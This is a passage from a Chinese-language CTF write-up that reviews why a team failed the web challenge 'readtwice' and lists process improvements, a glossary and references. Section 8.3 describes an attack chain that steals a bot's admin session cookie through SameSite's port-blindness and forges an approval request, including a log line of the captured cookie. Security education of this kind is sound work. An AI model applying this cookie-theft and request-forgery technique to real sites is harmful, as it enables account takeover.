第一次误判来自简化的实验：用两个简单页面测试 `goBack()`，观察到浏览器直接用 BFCache 恢复页面、没有发出网络请求，将结论泛化为"历史回退不会重新发请求"。而真实攻击序列包含三个实验里没有的状态要素：页面曾打开弹窗、先导航到 `about:blank`、响应带 `no-store`。在这组状态下，回退产生了真实的网络请求（4.1 日志的 `entry visit #2`）。

第二次误判来自对二手信息的采信：检索到的 Firefox bug 报告（bug 1648825）中有一句对 Chrome 行为的描述（大意：Chrome 在历史回退场景下发送 `cross-site`）。当时据此为"回退不可行"增加了一条依据，而没有本地复测。该描述的适用场景与本题不同；本题环境实测回退请求带 `none`（4.2 日志第 5 行的 `sf=none/document`）。

当时可执行而未做的动作：按完整状态要素重做实验；用 10 分钟写一个最小页面（回退后打印收到的请求头）复测该断言。

**卡点三：错误结论导致的方向分配**

"检查器不可绕过"的结论一旦成立，攻击链就只剩"在不执行笔记脚本的前提下拼齐状态"这一条路，全部时间随之后期投入 `Sec-Fetch` 方向与旁路链。方向分配本身是结论的合理推论。问题在于**结论的确定性是被高估的**：模糊测试的覆盖范围是字典枚举的构造空间，它对字典外的构造（未激活的旧知识与新特性）天然不可见。否定结论没有附覆盖范围声明，也没有设重新检查的时点，于是被当作已确认事实使用。

### 8.3 比赛期间的旁路链及其适用范围

比赛期间实现的旁路链解决了除"检查器绕过"外的全部环节，值得如实记录（它是理解八项检查的完整练习，也是"批准"环节可行性的独立验证）：

原理：**SameSite 的站点计算不包含端口**。`localhost:3000` 与 `localhost:4001` 属于同一站点，`SameSite=Lax` 的会话 cookie 会随发往同站点任意端口的请求发送。攻击者把服务器开在容器内 `localhost:4001` 时，机器人访问入口页的请求会带着管理员会话 cookie 到达：

```text
[ATK] GET /... | cookie=sid=s%3A...
```

配合两处信息泄漏（机器人把 `rid` 追加到提交的网址上，入口请求的 URL 里可见；`/review` 只校验 `rid` 不校验管理员，可以直接读出 `state`），攻击者就能用自己的服务器伪造一次 `/complete` 调用（带上窃取到的 `sid`），并让随后的 302 链通过全部检查。该链在本地连续 3 次成功。

适用范围：在远程环境里，回调服务器位于容器之外（跨站），cookie 不会发送（实测：入口请求的 Cookie 头为空）。因此该链只在"回调服务器与目标同站"时成立，不能用于真实远程环境。官方解法（2.6-2.9）不需要窃取会话：批准由审批页面完成、`none` 由历史回退产生，全部组件在远程条件下均成立。

### 8.4 失败原因的逐层定位

把 8.2 的三个卡点继续下挖，可归到四条原因与相应的结构缺口：

| # | 直接原因 | 结构缺口 |
|---|---|---|
| 1 | 把模糊测试的否定结果升级为"不可绕过"的确定性，并停止该方向搜索 | 否定结论没有固定的覆盖范围声明格式；"不可绕过"类结论没有强制重新检查的机制 |
| 2 | 全程只做答案向检索（"这类题怎么解、有没有同类题"），从未做机制向检索（"这个现象存在哪些可能机制"） | 检索策略单一，没有"卡壳时切换检索类型"的规则 |
| 3 | 用简化场景做实验，将结论外推到含更多状态要素的真实场景 | 实验设计前没有"先列全状态要素、再逐项覆盖"的清单 |
| 4 | 采信外部资料对他方行为的转述，未做本地复测 | 对"将决定方向取舍的外部断言"，没有一手验证规则 |

补充说明三点：

- 第 1 条是影响最大的一条：它发生在最早期，直接关闭了唯一通往正解的方向（检查器绕过），后面所有时间都在其余方向内分配；
- 第 2 条与第 1 条是同一个问题的两面：正因为不再怀疑"检查器不可绕过"，也就不会去问"可能存在哪些解析机制"，机制向检索的触发条件（结论存疑时）从未出现；
- 第 3、4 条相互独立，但作用在同一处：它们让"历史回退不可行"这个错误结论的确定性变得很难被推翻。

### 8.5 改进方案

针对 8.4 的结构缺口，列出五条具体措施。每条包含：措施（做什么）、载体（落在哪里）、验证方式（怎么确认它生效）。

| # | 措施 | 载体 | 验证方式 |
|---|---|---|---|
| 1 | 浏览器相关题目开工时，先检索目标浏览器近 12-18 个月的平台新特性（Chrome 开发者博客、Chromestatus） | 分析流程清单（开工检查项） | 检查开工记录里是否有"查新"步骤及结果 |
| 2 | 任何"不可行/不可绕过"类结论必须附覆盖范围声明（"本结论只覆盖〔已枚举的构造空间〕"），并设定强制重新检查的时点 | 分析笔记模板 | 抽查历史结论是否都带覆盖声明；到期结论是否被重新检查 |
| 3 | 检索双轨制：答案向（找同类解法）与机制向（问"存在哪些机制"）并行；卡壳超过数小时强制切换 | 分析流程清单 | 统计卡壳场景下是否执行了机制向检索 |
| 4 | 涉及浏览器状态组合的实验，先列出场景全部状态要素（弹窗、中间页、缓存头等）再设计实验；结论注明未覆盖的要素 | 实验记录模板 | 抽查实验记录是否含状态要素清单与未覆盖声明 |
| 5 | 对将决定方向取舍的外部断言（尤其是他方产品行为的转述），先做最小本地复测再采信 | 分析流程清单 | 抽查关键结论是否附本地复测记录 |

> 对本场比赛的回放（用第 1、2 条复盘）：如果开工第一条动作是"查新"，Chrome 博客 2026 年 5 月的 DPU 公告（含 `<?marker>` 示例）会直接进入视野；即便未命中，第 2 条也会在写"检查器不可绕过"时要求附上覆盖声明，使该结论无法被封存为最终答案，从而保留第 3 条触发机制向检索的机会。三条措施叠加，本次卡点一有较大概率被提前发现。

### 8.6 边界说明

- 上述措施提高"找到答案"的概率，不构成保证。它们的作用是：让正确的检索动作被执行、让错误的确定性可被推翻、让结论带着适用范围流通；
- 知识截止是一项硬限制：如果题目依赖发布不足数月、尚未被广泛文档化的特性，任何流程都无法替代"先把信息取回来"这一步，只能靠第 1 条（查新）提前完成信息获取；
- 赛后可查证：本题在比赛期间共有 14 支队伍解出，所需信息（Chrome 官方博客、MDN、WHATWG 规范）全部公开可检索。因此失败不在"信息不可得"，而在取用信息的策略（8.4 的四条）。这也是复盘的价值所在：错误可定位、可修正、可复查。

---

## 附录

### 附 A：源码文件对照

| 文件 | 内容 | 相关章节 |
|---|---|---|
| `src/server.js` | 全部路由、会话配置、审查状态机 | 2.2-2.4 |
| `bot/bot.js` | 检查器 `inspectDocument`；机器人 `review`、`watchDocument` | 2.2、2.3 |
| `src/views/review.ejs` | 审批页面（iframe + MessageChannel 批准逻辑） | 2.7 |
| `docker-compose.yml` | 环境变量与端口映射 | 2.1 |

### 附 B：术语速查

| 术语 | 一句话说明 |
|---|---|
| CTF | Capture The Flag，网络安全夺旗赛 |
| flag | 比赛的最终目标字符串（本题格式 `pwnsec{...}`） |
| 机器人（bot） | 题目内置的自动化无头浏览器，持有管理员会话 |
| 挑战域 | 题目服务器自身的网域（容器内为 `http://localhost:3000`） |
| 检查器 | 创建笔记时的 DOM 检查函数 `inspectDocument` |
| 审查页 | 路由 `/reports/check`；第一次访问做标记，第二次输出笔记原文 |
| 审批页面 | 路由 `/review`；包含沙箱 iframe 与批准逻辑 |
| 沙箱页 | 路由 `/sandbox`；在 iframe 中渲染笔记（`sandbox allow-scripts`） |
| 入口页 | 攻击者提交给机器人的网址所指向的页面 |
| 回调服务器 | 攻击者控制的服务器（入口页、辅助页、注入脚本、接收 flag） |
| CSP | Content Security Policy，内容安全策略：限制页面可加载/执行的内容 |
| meta CSP | 写在 `<meta http-equiv>` 里的 CSP，解析到该标签时才生效 |
| XSS | Cross-Site Scripting，跨站脚本攻击：让攻击者脚本在目标站点页面上执行 |
| SameSite=Lax | cookie 属性：跨站请求不带 cookie，顶层导航例外 |
| 顶层导航 | 让整个窗口/标签页加载一个新文档的导航（区别于 iframe 内加载） |
| Fetch Metadata | 浏览器自动附加的 `Sec-Fetch-*` 请求头，标明请求的发起方式 |
| `Sec-Fetch-Site: none` | 请求由浏览器本身发起（书签、地址栏、历史回退/前进等），无页面来源 |
| 历史回退 | 浏览器后退/前进操作，属浏览器发起的导航 |
| BFCache | 浏览器把离开的页面整体缓存进内存的机制；回退时可能直接恢复而不发请求 |
| `about:blank` | 空白页；导航到它不产生网络请求 |
| `no-store` | `Cache-Control` 响应头取值之一：响应不得存入缓存 |
| 302 重定向 | 服务器指示浏览器改用新地址重新请求 |
| MessageChannel | 浏览器 API：创建一对互通的消息端口 |
| 消息端口转移 | `postMessage` 第三参数把端口所有权交给另一窗口（可跨源） |
| 声明式 Shadow DOM | 用 `<template shadowrootmode=...>` 创建影子树的写法 |
| 影子树 | 挂在元素上的独立 DOM 子树；不计入宿主元素的子元素计数与文本 |
| DPU | Declarative Partial Updates，声明式部分更新（2026-05 新特性） |
| 处理指令 | `<?marker ...>` 形式的节点；不是元素，不参与元素计数 |
| 解析阻塞 | 外部脚本加载/执行期间解析器暂停，后续内容延后解析 |
| rid | 本轮审查编号，作为 URL 参数；机器人自动追加到提交的网址上 |
| nonce / state | 服务器每轮随机生成的校验值；审批页面把它作为 `state` 提交给 `/complete` |
| visited / prepared / approved / finalized / used | 审查记录的五个状态位（含义见 3.2） |

### 附 C：本地环境版本

| 组件 | 版本/说明 |
|---|---|
| 容器运行时 | `node:22-bookworm-slim` |
| 容器内浏览器 | Chromium 152（题目镜像自带） |
| 宿主机运行环境 | Python 3.8+ 与 `requests` |
| 端口映射 | 宿主机 `3001` → 容器 `3000`；回调服务器 `8000` |

### 附 D：资料与出处

- 官方题解仓库（本题解法来源，本文复现所依据的脚本即改编自此）：`https://github.com/stack1245/PwnSec-CTF-2026`（`web/readtwice/`）
- DPU 官方公告（2026-05-19）：`https://developer.chrome.com/blog/declarative-partial-updates`
- 声明式 Shadow DOM（web.dev）：`https://web.dev/articles/declarative-shadow-dom`
- `<template>` 元素文档（MDN，含 `shadowrootmode` 解析语义）：`https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/template`
- DPU 提案仓库（WICG）：`https://github.com/WICG/declarative-partial-updates`
- 历史回退与 Fetch Metadata 的相关讨论（Firefox bug 1648825）：`https://bugzilla.mozilla.org/show_bug.cgi?id=1648825`

（完）
